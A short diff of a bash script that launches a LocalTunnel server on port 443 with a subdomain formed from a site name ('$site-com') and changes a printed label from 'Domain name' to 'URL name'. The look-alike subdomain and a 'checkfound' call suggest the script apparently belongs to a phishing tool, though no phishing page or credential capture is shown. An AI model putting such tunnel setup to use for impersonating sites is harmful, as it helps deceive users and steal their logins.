@@ -354,7 +354,7 @@ printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server\n"
 xterm -hold -geometry 90x26+1000+1000 -T "LocalTunnel server" -e "lt --port 443 --subdomain $site-com" > /dev/null 2>&1 &
 sleep 10
 printf "${BGreen}OK.${clear}\n\n"
-printf "${BYellow}Your Domain name is: ${BGreen}https://$site-com.loca.lt\n"
+printf "${BYellow}Your URL name is: ${BGreen}https://$site-com.loca.lt\n"
 checkfound
 #===============================================
 }
